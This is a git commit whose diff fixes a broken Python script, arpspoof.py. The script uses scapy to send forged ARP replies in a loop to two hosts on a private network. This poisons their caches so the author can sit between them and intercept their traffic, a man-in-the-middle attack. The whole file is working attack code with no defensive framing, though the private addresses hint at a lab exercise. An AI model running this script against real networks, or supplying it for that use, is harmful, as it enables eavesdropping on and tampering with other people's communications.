a0d00622976be2fac7f58b33be7a9c0220cd6f45
ManilLaro <manilou2006@gmail.com>
2026-06-01 12:48:36 +0400

    Fix ARP spoofing logic and improve output messages

--- arpspoof.py
+++ arpspoof.py
@@ -1,13 +1,18 @@
 from scapy.all import ARP, send, getmacbyip
 import time
-CLIENT_IP= "10.0.0.1"
-SERVER_IP= "10.0.0.2"
+
+CLIENT_IP = "10.0.0.1"
+SERVER_IP = "10.0.0.2"
+
 def spoof(target_ip, spoofed_ip):
+    target_mac = getmacbyip(target_ip)
+    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip), verbose=False)
+
 try:
-target_mac
-getmacbyip(target_ip)
-send(ARP(op=2, pdst=target_ip, hwdst-target_mac, psrc=spoofed_ip), verbose=False)
-print("[+] ARP spoofing started... Ctrl+C to stop") while True:
-spoof (CLIENT_IP, SERVER_IP) spoof(SERVER_IP, CLIENT_IP) time.sleep(2)
+    print("[*] ARP spoofing started... Ctrl+C to stop")
+    while True:
+        spoof(CLIENT_IP, SERVER_IP)
+        spoof(SERVER_IP, CLIENT_IP)
+        time.sleep(2)
 except KeyboardInterrupt:
-print("\n[*] Stopped.")
+    print("\n[*] Stopped.")
